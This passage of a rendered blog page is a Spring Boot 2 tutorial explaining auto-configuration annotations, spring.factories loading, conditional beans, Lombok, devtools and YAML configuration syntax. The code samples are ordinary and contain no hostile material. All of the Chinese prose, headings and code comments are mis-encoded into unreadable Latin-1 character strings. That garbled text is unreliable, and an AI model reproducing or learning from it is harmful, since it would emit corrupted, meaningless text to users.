class="hljs-meta">    type = FilterType.CUSTOM,</span><br><span class="hljs-meta">    classes = &#123;AutoConfigurationExcludeFilter.class&#125;</span><br><span class="hljs-meta">)&#125;</span><br><span class="hljs-meta">)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> SpringBootApplication &#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>é‡ç‚¹åˆ†æ<code>@SpringBootConfiguration</code>ï¼Œ<code>@EnableAutoConfiguration</code>ï¼Œ<code>@ComponentScan</code>ã€‚</p><h3 id="SpringBootConfiguration"><a href="#SpringBootConfiguration" class="headerlink" title="@SpringBootConfiguration"></a>@SpringBootConfiguration</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Target(ElementType.TYPE)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Documented</span><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> SpringBootConfiguration &#123;<br>    <span class="hljs-meta">@AliasFor(</span><br><span class="hljs-meta">        annotation = Configuration.class</span><br><span class="hljs-meta">    )</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">proxyBeanMethods</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>@Configuration</code>ä»£è¡¨å½“å‰æ˜¯ä¸€ä¸ªé…ç½®ç±»ã€‚</p><h3 id="ComponentScan"><a href="#ComponentScan" class="headerlink" title="@ComponentScan"></a>@ComponentScan</h3><p>æŒ‡å®šæ‰«æå“ªäº›Springæ³¨è§£ã€‚</p><p>@ComponentScan åœ¨<a href="#">07ã€åŸºç¡€å…¥é—¨-SpringBoot-è‡ªåŠ¨é…ç½®ç‰¹æ€§</a>æœ‰ç”¨ä¾‹ã€‚</p><h3 id="EnableAutoConfiguration"><a href="#EnableAutoConfiguration" class="headerlink" title="@EnableAutoConfiguration"></a>@EnableAutoConfiguration</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Target(ElementType.TYPE)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Documented</span><br><span class="hljs-meta">@Inherited</span><br><span class="hljs-meta">@AutoConfigurationPackage</span><br><span class="hljs-meta">@Import(AutoConfigurationImportSelector.class)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> EnableAutoConfiguration &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">ENABLED_OVERRIDE_PROPERTY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;spring.boot.enableautoconfiguration&quot;</span>;<br><br>    Class&lt;?&gt;[] exclude() <span class="hljs-keyword">default</span> &#123;&#125;;<br><br>    String[] excludeName() <span class="hljs-keyword">default</span> &#123;&#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>é‡ç‚¹åˆ†æ<code>@AutoConfigurationPackage</code>ï¼Œ<code>@Import(AutoConfigurationImportSelector.class)</code>ã€‚</p><h4 id="AutoConfigurationPackage"><a href="#AutoConfigurationPackage" class="headerlink" title="@AutoConfigurationPackage"></a>@AutoConfigurationPackage</h4><p>æ ‡ç­¾åç›´è¯‘ä¸ºï¼šè‡ªåŠ¨é…ç½®åŒ…ï¼ŒæŒ‡å®šäº†é»˜è®¤çš„åŒ…è§„åˆ™ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Target(ElementType.TYPE)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Documented</span><br><span class="hljs-meta">@Inherited</span><br><span class="hljs-meta">@Import(AutoConfigurationPackages.Registrar.class)</span><span class="hljs-comment">//ç»™å®¹å™¨ä¸­å¯¼å…¥ä¸€ä¸ªç»„ä»¶</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> AutoConfigurationPackage &#123;<br>    String[] basePackages() <span class="hljs-keyword">default</span> &#123;&#125;;<br><br>    Class&lt;?&gt;[] basePackageClasses() <span class="hljs-keyword">default</span> &#123;&#125;;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>åˆ©ç”¨Registrarç»™å®¹å™¨ä¸­å¯¼å…¥ä¸€ç³»åˆ—ç»„ä»¶</li><li>å°†æŒ‡å®šçš„ä¸€ä¸ªåŒ…ä¸‹çš„æ‰€æœ‰ç»„ä»¶å¯¼å…¥è¿›MainApplicationæ‰€åœ¨åŒ…ä¸‹ã€‚</li></ol><h2 id="14ã€è‡ªåŠ¨é…ç½®ã€æºç åˆ†æã€‘-åˆå§‹åŠ è½½è‡ªåŠ¨é…ç½®ç±»"><a href="#14ã€è‡ªåŠ¨é…ç½®ã€æºç åˆ†æã€‘-åˆå§‹åŠ è½½è‡ªåŠ¨é…ç½®ç±»" class="headerlink" title="14ã€è‡ªåŠ¨é…ç½®ã€æºç åˆ†æã€‘-åˆå§‹åŠ è½½è‡ªåŠ¨é…ç½®ç±»"></a>14ã€è‡ªåŠ¨é…ç½®ã€æºç åˆ†æã€‘-åˆå§‹åŠ è½½è‡ªåŠ¨é…ç½®ç±»</h2><h4 id="Import-AutoConfigurationImportSelector-class"><a href="#Import-AutoConfigurationImportSelector-class" class="headerlink" title="@Import(AutoConfigurationImportSelector.class)"></a>@Import(AutoConfigurationImportSelector.class)</h4><ol><li>åˆ©ç”¨<code>getAutoConfigurationEntry(annotationMetadata);</code>ç»™å®¹å™¨ä¸­æ‰¹é‡å¯¼å…¥ä¸€äº›ç»„ä»¶</li><li>è°ƒç”¨<code>List&lt;String&gt; configurations = getCandidateConfigurations(annotationMetadata, attributes)</code>è·å–åˆ°æ‰€æœ‰éœ€è¦å¯¼å…¥åˆ°å®¹å™¨ä¸­çš„é…ç½®ç±»</li><li>åˆ©ç”¨å·¥å‚åŠ è½½ <code>Map&lt;String, List&lt;String&gt;&gt; loadSpringFactories(@Nullable ClassLoader classLoader);</code>å¾—åˆ°æ‰€æœ‰çš„ç»„ä»¶</li><li>ä»<code>META-INF/spring.factories</code>ä½ç½®æ¥åŠ è½½ä¸€ä¸ªæ–‡ä»¶ã€‚<ul><li>é»˜è®¤æ‰«ææˆ‘ä»¬å½“å‰ç³»ç»Ÿé‡Œé¢æ‰€æœ‰<code>META-INF/spring.factories</code>ä½ç½®çš„æ–‡ä»¶</li><li><code>spring-boot-autoconfigure-2.3.4.RELEASE.jar</code>åŒ…é‡Œé¢ä¹Ÿæœ‰<code>META-INF/spring.factories</code></li></ul></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210205005536620.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-comment"># æ–‡ä»¶é‡Œé¢å†™æ­»äº†spring-bootä¸€å¯åŠ¨å°±è¦ç»™å®¹å™¨ä¸­åŠ è½½çš„æ‰€æœ‰é…ç½®ç±»</span><br><span class="hljs-comment"># spring-boot-autoconfigure-2.3.4.RELEASE.jar/META-INF/spring.factories</span><br><span class="hljs-comment"># Auto Configure</span><br><span class="hljs-attr">org.springframework.boot.autoconfigure.EnableAutoConfiguration</span>=<span class="hljs-string">\</span><br><span class="hljs-string">org.springframework.boot.autoconfigure.admin.SpringApplicationAdminJmxAutoConfiguration,\</span><br><span class="hljs-string">org.springframework.boot.autoconfigure.aop.AopAutoConfiguration,\</span><br><span class="hljs-string">...</span><br></code></pre></td></tr></table></figure><p>è™½ç„¶æˆ‘ä»¬127ä¸ªåœºæ™¯çš„æ‰€æœ‰è‡ªåŠ¨é…ç½®å¯åŠ¨çš„æ—¶å€™é»˜è®¤å…¨éƒ¨åŠ è½½ï¼Œä½†æ˜¯<code>xxxxAutoConfiguration</code>æŒ‰ç…§æ¡ä»¶è£…é…è§„åˆ™ï¼ˆ<code>@Conditional</code>ï¼‰ï¼Œæœ€ç»ˆä¼šæŒ‰éœ€é…ç½®ã€‚</p><p>å¦‚<code>AopAutoConfiguration</code>ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration(</span><br><span class="hljs-meta">    proxyBeanMethods = false</span><br><span class="hljs-meta">)</span><br><span class="hljs-meta">@ConditionalOnProperty(</span><br><span class="hljs-meta">    prefix = &quot;spring.aop&quot;,</span><br><span class="hljs-meta">    name = &quot;auto&quot;,</span><br><span class="hljs-meta">    havingValue = &quot;true&quot;,</span><br><span class="hljs-meta">    matchIfMissing = true</span><br><span class="hljs-meta">)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AopAutoConfiguration</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">AopAutoConfiguration</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="15ã€è‡ªåŠ¨é…ç½®ã€æºç åˆ†æã€‘-è‡ªåŠ¨é…ç½®æµç¨‹"><a href="#15ã€è‡ªåŠ¨é…ç½®ã€æºç åˆ†æã€‘-è‡ªåŠ¨é…ç½®æµç¨‹" class="headerlink" title="15ã€è‡ªåŠ¨é…ç½®ã€æºç åˆ†æã€‘-è‡ªåŠ¨é…ç½®æµç¨‹"></a>15ã€è‡ªåŠ¨é…ç½®ã€æºç åˆ†æã€‘-è‡ªåŠ¨é…ç½®æµç¨‹</h2><p>ä»¥<code>DispatcherServletAutoConfiguration</code>çš„å†…éƒ¨ç±»<code>DispatcherServletConfiguration</code>ä¸ºä¾‹å­:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Bean</span><br><span class="hljs-meta">@ConditionalOnBean(MultipartResolver.class)</span>  <span class="hljs-comment">//å®¹å™¨ä¸­æœ‰è¿™ä¸ªç±»å‹ç»„ä»¶</span><br><span class="hljs-meta">@ConditionalOnMissingBean(name = DispatcherServlet.MULTIPART_RESOLVER_BEAN_NAME)</span> <span class="hljs-comment">//å®¹å™¨ä¸­æ²¡æœ‰è¿™ä¸ªåå­— multipartResolver çš„ç»„ä»¶</span><br><span class="hljs-keyword">public</span> MultipartResolver <span class="hljs-title function_">multipartResolver</span><span class="hljs-params">(MultipartResolver resolver)</span> &#123;<br><span class="hljs-comment">//ç»™@Beanæ ‡æ³¨çš„æ–¹æ³•ä¼ å…¥äº†å¯¹è±¡å‚æ•°ï¼Œè¿™ä¸ªå‚æ•°çš„å€¼å°±ä¼šä»å®¹å™¨ä¸­æ‰¾ã€‚</span><br><span class="hljs-comment">//SpringMVC multipartResolverã€‚é˜²æ­¢æœ‰äº›ç”¨æˆ·é…ç½®çš„æ–‡ä»¶ä¸Šä¼ è§£æå™¨ä¸ç¬¦åˆè§„èŒƒ</span><br><span class="hljs-comment">// Detect if the user has created a MultipartResolver but named it incorrectly</span><br><span class="hljs-keyword">return</span> resolver;<span class="hljs-comment">//ç»™å®¹å™¨ä¸­åŠ å…¥äº†æ–‡ä»¶ä¸Šä¼ è§£æå™¨ï¼›</span><br>&#125;<br></code></pre></td></tr></table></figure><p>SpringBooté»˜è®¤ä¼šåœ¨åº•å±‚é…å¥½æ‰€æœ‰çš„ç»„ä»¶ï¼Œä½†æ˜¯<strong>å¦‚æœç”¨æˆ·è‡ªå·±é…ç½®äº†ä»¥ç”¨æˆ·çš„ä¼˜å…ˆ</strong>ã€‚</p><p><strong>æ€»ç»“</strong>ï¼š</p><ul><li>SpringBootå…ˆåŠ è½½æ‰€æœ‰çš„è‡ªåŠ¨é…ç½®ç±»  xxxxxAutoConfiguration</li><li>æ¯ä¸ªè‡ªåŠ¨é…ç½®ç±»æŒ‰ç…§æ¡ä»¶è¿›è¡Œç”Ÿæ•ˆï¼Œé»˜è®¤éƒ½ä¼šç»‘å®šé…ç½®æ–‡ä»¶æŒ‡å®šçš„å€¼ã€‚ï¼ˆxxxxPropertiesé‡Œé¢è¯»å–ï¼ŒxxxPropertieså’Œé…ç½®æ–‡ä»¶è¿›è¡Œäº†ç»‘å®šï¼‰</li><li>ç”Ÿæ•ˆçš„é…ç½®ç±»å°±ä¼šç»™å®¹å™¨ä¸­è£…é…å¾ˆå¤šç»„ä»¶</li><li>åªè¦å®¹å™¨ä¸­æœ‰è¿™äº›ç»„ä»¶ï¼Œç›¸å½“äºè¿™äº›åŠŸèƒ½å°±æœ‰äº†</li><li>å®šåˆ¶åŒ–é…ç½®<ul><li>ç”¨æˆ·ç›´æ¥è‡ªå·±@Beanæ›¿æ¢åº•å±‚çš„ç»„ä»¶</li><li>ç”¨æˆ·å»çœ‹è¿™ä¸ªç»„ä»¶æ˜¯è·å–çš„é…ç½®æ–‡ä»¶ä»€ä¹ˆå€¼å°±å»ä¿®æ”¹ã€‚</li></ul></li></ul><p><strong>xxxxxAutoConfiguration â€”&gt; ç»„ä»¶ â€”&gt; xxxxPropertiesé‡Œé¢æ‹¿å€¼  â€”-&gt; application.properties</strong></p><h2 id="16ã€æœ€ä½³å®è·µ-SpringBootåº”ç”¨å¦‚ä½•ç¼–å†™"><a href="#16ã€æœ€ä½³å®è·µ-SpringBootåº”ç”¨å¦‚ä½•ç¼–å†™" class="headerlink" title="16ã€æœ€ä½³å®è·µ-SpringBootåº”ç”¨å¦‚ä½•ç¼–å†™"></a>16ã€æœ€ä½³å®è·µ-SpringBootåº”ç”¨å¦‚ä½•ç¼–å†™</h2><ul><li>å¼•å…¥åœºæ™¯ä¾èµ–<ul><li><a href="https://docs.spring.io/spring-boot/docs/current/reference/html/using-spring-boot.html#using-boot-starter">å®˜æ–¹æ–‡æ¡£</a></li></ul></li><li>æŸ¥çœ‹è‡ªåŠ¨é…ç½®äº†å“ªäº›ï¼ˆé€‰åšï¼‰<ul><li>è‡ªå·±åˆ†æï¼Œå¼•å…¥åœºæ™¯å¯¹åº”çš„è‡ªåŠ¨é…ç½®ä¸€èˆ¬éƒ½ç”Ÿæ•ˆäº†</li><li>é…ç½®æ–‡ä»¶ä¸­debug&#x3D;trueå¼€å¯è‡ªåŠ¨é…ç½®æŠ¥å‘Šã€‚<ul><li>Negativeï¼ˆä¸ç”Ÿæ•ˆï¼‰</li><li>Positiveï¼ˆç”Ÿæ•ˆï¼‰</li></ul></li></ul></li><li>æ˜¯å¦éœ€è¦ä¿®æ”¹<ul><li>å‚ç…§æ–‡æ¡£ä¿®æ”¹é…ç½®é¡¹<ul><li><a href="https://docs.spring.io/spring-boot/docs/current/reference/html/appendix-application-properties.html#common-application-properties">å®˜æ–¹æ–‡æ¡£</a></li><li>è‡ªå·±åˆ†æã€‚xxxxPropertiesç»‘å®šäº†é…ç½®æ–‡ä»¶çš„å“ªäº›ã€‚</li></ul></li><li>è‡ªå®šä¹‰åŠ å…¥æˆ–è€…æ›¿æ¢ç»„ä»¶<ul><li>@Beanã€@Componentâ€¦</li></ul></li><li>è‡ªå®šä¹‰å™¨  XXXXXCustomizerï¼›</li><li>â€¦â€¦</li></ul></li></ul><h2 id="17ã€æœ€ä½³å®è·µ-Lombokç®€åŒ–å¼€å‘"><a href="#17ã€æœ€ä½³å®è·µ-Lombokç®€åŒ–å¼€å‘" class="headerlink" title="17ã€æœ€ä½³å®è·µ-Lombokç®€åŒ–å¼€å‘"></a>17ã€æœ€ä½³å®è·µ-Lombokç®€åŒ–å¼€å‘</h2><p>Lombokç”¨æ ‡ç­¾æ–¹å¼ä»£æ›¿æ„é€ å™¨ã€getter&#x2F;setterã€toString()ç­‰é¸¡è‚‹ä»£ç ã€‚</p><p>spring bootå·²ç»ç®¡ç†Lombokã€‚å¼•å…¥ä¾èµ–ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"> <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>IDEAä¸­File-&gt;Settings-&gt;Pluginsï¼Œæœç´¢å®‰è£…Lombokæ’ä»¶ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@NoArgsConstructor</span><br><span class="hljs-comment">//@AllArgsConstructor</span><br><span class="hljs-meta">@Data</span><br><span class="hljs-meta">@ToString</span><br><span class="hljs-meta">@EqualsAndHashCode</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> Integer age;<br><br>    <span class="hljs-keyword">private</span> Pet pet;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name,Integer age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><p>ç®€åŒ–æ—¥å¿—å¼€å‘</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">handle01</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;name&quot;)</span> String name)</span>&#123;<br>        log.info(<span class="hljs-string">&quot;è¯·æ±‚è¿›æ¥äº†....&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello, Spring Boot 2!&quot;</span>+<span class="hljs-string">&quot;ä½ å¥½ï¼š&quot;</span>+name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="18ã€æœ€ä½³å®è·µ-dev-tools"><a href="#18ã€æœ€ä½³å®è·µ-dev-tools" class="headerlink" title="18ã€æœ€ä½³å®è·µ-dev-tools"></a>18ã€æœ€ä½³å®è·µ-dev-tools</h2><blockquote><p>Spring Boot includes an additional set of tools that can make the application development experience a little more pleasant. The <code>spring-boot-devtools</code> module can be included in any project to provide additional development-time features.â€”â€”<a href="https://docs.spring.io/spring-boot/docs/2.3.8.RELEASE/reference/html/using-spring-boot.html#using-boot-devtools">link</a></p><p>Applications that use <code>spring-boot-devtools</code> automatically restart whenever files on the classpath change. This can be a useful feature when working in an IDE, as it gives a very fast feedback loop for code changes. By default, any entry on the classpath that points to a directory is monitored for changes. Note that certain resources, such as static assets and view templates, <a href="https://docs.spring.io/spring-boot/docs/2.3.8.RELEASE/reference/html/using-spring-boot.html#using-boot-devtools-restart-exclude">do not need to restart the application</a>.â€”â€”<a href="https://docs.spring.io/spring-boot/docs/2.3.8.RELEASE/reference/html/using-spring-boot.html#using-boot-devtools-restart">link</a></p><p>Triggering a restart</p><p>As DevTools monitors classpath resources, the only way to trigger a restart is to update the classpath. The way in which you cause the classpath to be updated depends on the IDE that you are using:</p><ul><li>In Eclipse, saving a modified file causes the classpath to be updated and triggers a restart.</li><li>In IntelliJ IDEA, building the project (<code>Build -&gt; Build Project</code>)(shortcut: Ctrl+F9) has the same effect.</li></ul></blockquote><p>æ·»åŠ ä¾èµ–ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-devtools<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>åœ¨IDEAä¸­ï¼Œé¡¹ç›®æˆ–è€…é¡µé¢ä¿®æ”¹ä»¥åï¼šCtrl+F9ã€‚</p><h2 id="19ã€æœ€ä½³å®è·µ-Spring-Initailizr"><a href="#19ã€æœ€ä½³å®è·µ-Spring-Initailizr" class="headerlink" title="19ã€æœ€ä½³å®è·µ-Spring Initailizr"></a>19ã€æœ€ä½³å®è·µ-Spring Initailizr</h2><p><a href="https://start.spring.io/">Spring Initailizr</a>æ˜¯åˆ›å»ºSpring Bootå·¥ç¨‹å‘å¯¼ã€‚</p><p>åœ¨IDEAä¸­ï¼Œèœå•æ New -&gt; Project -&gt; Spring Initailizrã€‚</p><h1 id="SpringBoot2æ ¸å¿ƒæŠ€æœ¯-æ ¸å¿ƒåŠŸèƒ½"><a href="#SpringBoot2æ ¸å¿ƒæŠ€æœ¯-æ ¸å¿ƒåŠŸèƒ½" class="headerlink" title="SpringBoot2æ ¸å¿ƒæŠ€æœ¯-æ ¸å¿ƒåŠŸèƒ½"></a><strong>SpringBoot2æ ¸å¿ƒæŠ€æœ¯-æ ¸å¿ƒåŠŸèƒ½</strong></h1><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202207211458073.jpg" alt="yuque_diagram"></p><p><strong>SpringBoot2æ ¸å¿ƒæŠ€æœ¯-æ ¸å¿ƒåŠŸèƒ½</strong></p><h2 id="20ã€é…ç½®æ–‡ä»¶-yamlçš„ç”¨æ³•"><a href="#20ã€é…ç½®æ–‡ä»¶-yamlçš„ç”¨æ³•" class="headerlink" title="20ã€é…ç½®æ–‡ä»¶-yamlçš„ç”¨æ³•"></a>20ã€é…ç½®æ–‡ä»¶-yamlçš„ç”¨æ³•</h2><p>åŒä»¥å‰çš„propertiesç”¨æ³•</p><p>YAML æ˜¯ â€œYAML Ainâ€™t Markup Languageâ€ï¼ˆYAML ä¸æ˜¯ä¸€ç§æ ‡è®°è¯­è¨€ï¼‰çš„é€’å½’ç¼©å†™ã€‚åœ¨å¼€å‘çš„è¿™ç§è¯­è¨€æ—¶ï¼ŒYAML çš„æ„æ€å…¶å®æ˜¯ï¼šâ€Yet Another Markup Languageâ€ï¼ˆä»æ˜¯ä¸€ç§æ ‡è®°è¯­è¨€ï¼‰ã€‚ </p><p><strong>éå¸¸é€‚åˆç”¨æ¥åšä»¥æ•°æ®ä¸ºä¸­å¿ƒçš„é…ç½®æ–‡ä»¶</strong>ã€‚</p><h3 id="åŸºæœ¬è¯­æ³•"><a href="#åŸºæœ¬è¯­æ³•" class="headerlink" title="åŸºæœ¬è¯­æ³•"></a>åŸºæœ¬è¯­æ³•</h3><ul><li>key: valueï¼›kvä¹‹é—´æœ‰ç©ºæ ¼</li><li>å¤§å°å†™æ•æ„Ÿ</li><li>ä½¿ç”¨ç¼©è¿›è¡¨ç¤ºå±‚çº§å…³ç³»</li><li>ç¼©è¿›ä¸å…è®¸ä½¿ç”¨tabï¼Œåªå…è®¸ç©ºæ ¼</li><li>ç¼©è¿›çš„ç©ºæ ¼æ•°ä¸é‡è¦ï¼Œåªè¦ç›¸åŒå±‚çº§çš„å…ƒç´ å·¦å¯¹é½å³å¯</li><li>â€˜#â€™è¡¨ç¤ºæ³¨é‡Š</li><li>å­—ç¬¦ä¸²æ— éœ€åŠ å¼•å·ï¼Œå¦‚æœè¦åŠ ï¼Œå•å¼•å·â€™â€™ã€åŒå¼•å·â€â€è¡¨ç¤ºå­—ç¬¦ä¸²å†…å®¹ä¼šè¢« è½¬ä¹‰ã€ä¸è½¬ä¹‰</li></ul><h3 id="æ•°æ®ç±»å‹"><a href="#æ•°æ®ç±»å‹" class="headerlink" title="æ•°æ®ç±»å‹"></a>æ•°æ®ç±»å‹</h3><ul><li>å­—é¢é‡ï¼šå•ä¸ªçš„ã€ä¸å¯å†åˆ†çš„å€¼ã€‚dateã€booleanã€stringã€numberã€null</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">k:</span> <span class="hljs-string">v</span><br></code></pre></td></tr></table></figure><ul><li>å¯¹è±¡ï¼šé”®å€¼å¯¹çš„é›†åˆã€‚mapã€hashã€setã€object</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment">#è¡Œå†…å†™æ³•ï¼š  </span><br><br><span class="hljs-attr">k:</span> &#123;<span class="hljs-string">k1:v1</span>,<span class="hljs-string">k2:v2</span>,<span class="hljs-string">k3:v3</span>&#125;<br><br><span class="hljs-comment">#æˆ–</span><br><br><span class="hljs-attr">k:</span> <br>  <span class="hljs-attr">k1:</span> <span class="hljs-string">v1</span><br>  <span class="hljs-attr">k2:</span> <span class="hljs-string">v2</span><br>  <span class="hljs-attr">k3:</span> <span class="hljs-string">v3</span><br></code></pre></td></tr></table></figure><ul><li>æ•°ç»„ï¼šä¸€ç»„æŒ‰æ¬¡åºæ’åˆ—çš„å€¼ã€‚arrayã€listã€queue</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment">#è¡Œå†…å†™æ³•ï¼š  </span><br><br><span class="hljs-attr">k:</span> [<span class="hljs-string">v1</span>,<span class="hljs-string">v2</span>,<span class="hljs-string">v3</span>]<br><br><span class="hljs-comment">#æˆ–è€…</span><br><br><span class="hljs-attr">k:</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">v1</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">v2</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">v3</span><br></code></pre></td></tr></table></figure><h3 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 